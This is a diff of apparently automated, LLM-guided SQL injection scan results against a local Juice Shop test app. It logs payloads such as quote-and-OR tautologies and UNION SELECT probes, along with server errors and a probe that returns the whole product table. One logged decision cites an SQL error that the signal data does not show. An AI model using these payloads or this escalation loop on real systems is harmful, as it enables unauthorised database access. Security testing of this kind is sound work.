+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.\",\"price\":5000,\"deluxePrice\":5000,\"image\":\"artwork2.jpg\",\"createdAt\":\"2026-06-26T06:07:36.881Z\",\"updatedAt\":\"2026-06-26T06:07:36.881Z\",\"deletedAt\":null}}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2095,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 3030,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: Unexpected path: [REDACTED_PATH]=46%20/*</h2>\n      <ul id=\"stacktrace\"><li> &nbsp; &nbsp;at [REDACTED_PATH]:42:18</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:225:26</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] ([REDACTED_PATH]:95:5)</li><li> &nbsp; &nbsp;at trim_prefix ([REDACTED_PATH]:328:13)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:286:9</li><li> &nbsp; &nbsp;at router.process_params ([REDACTED_PATH]:346:12)</li><li> &nbsp; &nbsp;at next ([REDACTED_PATH]:280:10)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]/"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 2439,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.8,
+                "reason": "SQL error in probe response and meaningful body change",
+                "next_step": "continue with stronger confirmation if attempts remain"
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached."
+        },
+        {
+          "name": "d",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "product_id is a numeric path parameter"
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 0.0,
+            "reason": "parameter 'd' is a query parameter and does not plausibly influence a database query, lookup, search, or authentication check",
+            "starting_strategy": "skip"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: parameter 'd' is a query parameter and does not plausibly influence a database query, lookup, search, or authentication check"
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/api/Products/6",
+      "url": "http://127.0.0.1:8080/api/Products/6",
+      "endpoint_context": {
+        "endpoint_type": "product_detail",
+        "resource": "Product details",
+        "likely_sql_context": "id_lookup",
+        "recommended_attack_style": "numeric_identifier_probe",
+        "avoid_payload_styles": [
+          "union_enum",
+          "auth_bypass"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.9,
+        "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup."
+      },
+      "params": [
+        {
+          "name": "product_id",
+          "in": "path",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product details",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup."
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.9,
+            "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup.",
+            "starting_strategy": "numeric_identifier_probe"
+          },
+          "payload_count": 1,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "123' OR 1=1 --",
+              "payload_rationale": "numeric identifier probe with boolean confirmation",
+              "expected_signal": "SQL parser error or unexpected response",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2099,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 263,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":6,\"name\":\"Banana Juice (1000ml)\",\"description\":\"Monkeys love it the most.\",\"price\":1.99,\"deluxePrice\":1.99,\"image\":\"banana_juice.jpg\",\"createdAt\":\"2026-06-26T06:07:36.879Z\",\"updatedAt\":\"2026-06-26T06:07:36.879Z\",\"deletedAt\":null}}"
+              },
+              "probe": {
+                "status_code": 404,
+                "elapsed_ms": 2070,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 35,
+                "body_sample": "{\"message\":\"Not Found\",\"errors\":[]}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 404,
+                "status_changed": true,
+                "content_type_changed": false,
+                "body_length_delta": -228,
+                "body_changed": true,
+                "elapsed_delta_ms": -29,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 0.0,
                 "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
                 "next_step": "Try another payload or gather more context."
               }
             }
           ],
-          "final_decision": "not_decidable",
-          "strongest_decision": "not_decidable",
-          "stop_reason": "Stopped because the response matched baseline closely; there was no useful error or behavior signal to adapt from."
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change."
+        },
+        {
+          "name": "d",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product details",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup."
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 0.0,
+            "reason": "The parameter 'd' is a query parameter and the recommended attack style is 'numeric_identifier_probe' for product detail endpoints.",
+            "starting_strategy": "Avoid payload styles: union_enum, auth_bypass"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: The parameter 'd' is a query parameter and the recommended attack style is 'numeric_identifier_probe' for product detail endpoints."
         }
       ]
     },
@@ -147,10 +777,7 @@
         "resource": "product search results",
         "likely_sql_context": "string_search",
         "recommended_attack_style": "string_search_error_probe",
-        "avoid_payload_styles": [
-          "auth_bypass",
-          "numeric_probe"
-        ],
+        "avoid_payload_styles": [],
         "probe_priority": "high",
         "confidence": 0.8,
         "reason": "search endpoint with query parameter"
@@ -164,10 +791,7 @@
             "resource": "product search results",
             "likely_sql_context": "string_search",
             "recommended_attack_style": "string_search_error_probe",
-            "avoid_payload_styles": [
-              "auth_bypass",
-              "numeric_probe"
-            ],
+            "avoid_payload_styles": [],
             "probe_priority": "high",
             "confidence": 0.8,
             "reason": "search endpoint with query parameter"
@@ -178,11 +802,11 @@
             "reason": "search endpoint with query parameter",
             "starting_strategy": "string_search_error_probe"
           },
-          "payload_count": 7,
+          "payload_count": 2,
           "attempts": [
             {
               "payload_phase": "primary_probe",
-              "payload": " OR 'a'='a",
+              "payload": " OR '1'='1",
               "payload_rationale": "string_search_error_probe",
               "expected_signal": "SQL parser error",
               "expected_marker": "",
@@ -196,11 +820,11 @@
               },
               "probe": {
                 "status_code": 500,
-                "elapsed_ms": 2101,
+                "elapsed_ms": 2089,
                 "content_type": "text/html; charset=utf-8",
                 "location": "",
                 "body_length": 974,
-                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;1&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
               },
               "response_signal": {
                 "available": true,
@@ -210,9 +834,9 @@
                 "content_type_changed": true,
                 "body_length_delta": 944,
                 "body_changed": true,
-                "elapsed_delta_ms": 15,
+                "elapsed_delta_ms": 3,
                 "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;1&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
                 "dbms_hint": "sqlite",
                 "auth_bypass_like": false
               },
@@ -224,423 +848,77 @@
               }
             },
             {
-              "payload_phase": "read_confirmation",
-              "payload": "UNION SELECT NULL, 'marker'",
-              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
-              "expected_signal": "SQL parser/database error",
-              "expected_marker": "marker",
-              "baseline": {
-                "status_code": 200,
-                "elapsed_ms": 2098,
-                "content_type": "application/json; charset=utf-8",
-                "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
-              },
-              "probe": {
-                "status_code": 500,
-                "elapsed_ms": 2088,
-                "content_type": "text/html; charset=utf-8",
-                "location": "",
-                "body_length": 984,
-                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
-              },
-              "response_signal": {
-                "available": true,
-                "baseline_status": 200,
-                "probe_status": 500,
-                "status_changed": true,
-                "content_type_changed": true,
-                "body_length_delta": 954,
-                "body_changed": true,
-                "elapsed_delta_ms": -10,
-                "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
-                "dbms_hint": "sqlite",
-                "auth_bypass_like": false,
-                "read_marker": "marker",
-                "read_marker_reflected": false
-              },
-              "llm_decision": {
-                "decision": "escalate",
-                "confidence": 0.9,
-                "reason": "Probe response exposed a SQL parser/database error.",
-                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
-              }
-            },
-            {
               "payload_phase": "primary_probe",
-              "payload": " OR 'a'='b",
-              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
-              "expected_signal": "SQL parser error",
+              "payload": "' OR '1'='1 --",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a quote and a line comment marker.",
+              "expected_signal": "SQL parser error or a non-destructive read confirmation",
               "expected_marker": "",
               "baseline": {
                 "status_code": 200,
-                "elapsed_ms": 2091,
+                "elapsed_ms": 2119,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
                 "body_length": 30,
                 "body_sample": "{\"status\":\"success\",\"data\":[]}"
               },
               "probe": {
-                "status_code": 500,
-                "elapsed_ms": 2085,
-                "content_type": "text/html; charset=utf-8",
-                "location": "",
-                "body_length": 974,
-                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
-              },
-              "response_signal": {
-                "available": true,
-                "baseline_status": 200,
-                "probe_status": 500,
-                "status_changed": true,
-                "content_type_changed": true,
-                "body_length_delta": 944,
-                "body_changed": true,
-                "elapsed_delta_ms": -6,
-                "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
-                "dbms_hint": "sqlite",
-                "auth_bypass_like": false
-              },
-              "llm_decision": {
-                "decision": "escalate",
-                "confidence": 1.0,
-                "reason": "Probe response exposed a SQL parser/database error.",
-                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
-              }
-            },
-            {
-              "payload_phase": "primary_probe",
-              "payload": " OR 'a'='c",
-              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
-              "expected_signal": "SQL parser error with a syntax error message",
-              "expected_marker": "",
-              "baseline": {
                 "status_code": 200,
-                "elapsed_ms": 2064,
-                "content_type": "application/json; charset=utf-8",
-                "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
-              },
-              "probe": {
-                "status_code": 500,
-                "elapsed_ms": 2103,
-                "content_type": "text/html; charset=utf-8",
-                "location": "",
-                "body_length": 974,
-                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
-              },
-              "response_signal": {
-                "available": true,
-                "baseline_status": 200,
-                "probe_status": 500,
-                "status_changed": true,
-                "content_type_changed": true,
-                "body_length_delta": 944,
-                "body_changed": true,
-                "elapsed_delta_ms": 39,
-                "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
-                "dbms_hint": "sqlite",
-                "auth_bypass_like": false
-              },
-              "llm_decision": {
-                "decision": "escalate",
-                "confidence": 1.0,
-                "reason": "Probe response exposed a SQL parser/database error.",
-                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
-              }
-            },
-            {
-              "payload_phase": "primary_probe",
-              "payload": " OR 'a'='d",
-              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
-              "expected_signal": "SQL parser/database error",
-              "expected_marker": "",
-              "baseline": {
-                "status_code": 200,
-                "elapsed_ms": 2066,
-                "content_type": "application/json; charset=utf-8",
-                "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
-              },
-              "probe": {
-                "status_code": 500,
-                "elapsed_ms": 2071,
-                "content_type": "text/html; charset=utf-8",
-                "location": "",
-                "body_length": 974,
-                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
-              },
-              "response_signal": {
-                "available": true,
-                "baseline_status": 200,
-                "probe_status": 500,
-                "status_changed": true,
-                "content_type_changed": true,
-                "body_length_delta": 944,
-                "body_changed": true,
-                "elapsed_delta_ms": 5,
-                "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
-                "dbms_hint": "sqlite",
-                "auth_bypass_like": false
-              },
-              "llm_decision": {
-                "decision": "escalate",
-                "confidence": 1.0,
-                "reason": "Probe response exposed a SQL parser/database error.",
-                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
-              }
-            },
-            {
-              "payload_phase": "primary_probe",
-              "payload": " OR 'a'='e",
-              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
-              "expected_signal": "SQL parser/database error",
-              "expected_marker": "",
-              "baseline": {
-                "status_code": 200,
-                "elapsed_ms": 2056,
-                "content_type": "application/json; charset=utf-8",
-                "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
-              },
-              "probe": {
-                "status_code": 500,
                 "elapsed_ms": 2083,
-                "content_type": "text/html; charset=utf-8",
-                "location": "",
-                "body_length": 974,
-                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
-              },
-              "response_signal": {
-                "available": true,
-                "baseline_status": 200,
-                "probe_status": 500,
-                "status_changed": true,
-                "content_type_changed": true,
-                "body_length_delta": 944,
-                "body_changed": true,
-                "elapsed_delta_ms": 27,
-                "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
-                "dbms_hint": "sqlite",
-                "auth_bypass_like": false
-              },
-              "llm_decision": {
-                "decision": "escalate",
-                "confidence": 1.0,
-                "reason": "Probe response exposed a SQL parser/database error.",
-                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
-              }
-            },
-            {
-              "payload_phase": "primary_probe",
-              "payload": " OR 'a'='g",
-              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
-              "expected_signal": "SQL parser/database error",
-              "expected_marker": "",
-              "baseline": {
-                "status_code": 200,
-                "elapsed_ms": 2087,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
-              },
-              "probe": {
-                "status_code": 500,
-                "elapsed_ms": 2087,
-                "content_type": "text/html; charset=utf-8",
-                "location": "",
-                "body_length": 974,
-                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+                "body_length": 16563,
+                "body_sample": "{\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-06-26 06:07:36.879 +00:00\",\"updatedAt\":\"2026-06-26 06:07:36.879 +00:00\",\"deletedAt\":null},{\"id\":24,\"name\":\"Apple Pomace\",\"description\":\"Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href=\\\"/#recycle\\\">sent back to us</a> for recycling.\",\"price\":0.89,\"deluxePrice\":0.89,\"image\":\"apple_pressings.jpg\",\"createdAt\":\"2026-06-26 06:07:36.881 +00:00\",\"updatedAt\":\"2026-06-26 06:07:36.881 +00:00\",\"deletedAt\":null},{\"id\":6,\"name\":\"Banana Juice (1000ml)\",\"description\":\"Monkeys love it the most.\",\"price\":1.99,\"deluxePrice\":1.99,\"image\":\"banana_juice.jpg\",\"createdAt\":\"2026-06-26 06:07:36.879 +00:00\",\"updatedAt\":\"2026-06-26 06:07:36.879 +00:00\",\"deletedAt\":null},{\"id\":52,\"name\":\"Basil Smoothie\",\"description\":\"A unique blend of fresh basil and ginger for a healthy kick.\",\"price\":2.99,\"deluxePrice\":2.99,\"image\":\"basil_smoothie.png\",\"createdAt\":\"2026-06-26 06:07:36.882 +00:00\",\"updatedAt\":\"2026-06-26 06:07:36.882 +00:00\",\"deletedAt\":null},{\"id\":51,\"name\":\"Berry Juice (1000ml)\",\"description\":\"A delicious blend of fresh forest berries.\",\"price\":3.49,\"deluxePrice\":3.49,\"image\":\"berry_juice.png\",\"createdAt\":\"2026-06-26 06:07:36.882 +00:00\",\"updatedAt\":\"2026-06-26 06:07:36.882 +00:00\",\"deletedAt\":null},{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful ca"
               },
               "response_signal": {
                 "available": true,
                 "baseline_status": 200,
-                "probe_status": 500,
-                "status_changed": true,
-                "content_type_changed": true,
-                "body_length_delta": 944,
+                "probe_status": 200,
+                "status_changed": false,
+                "content_type_changed": false,
+                "body_length_delta": 16533,
                 "body_changed": true,
-                "elapsed_delta_ms": 0,
-                "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
-                "dbms_hint": "sqlite",
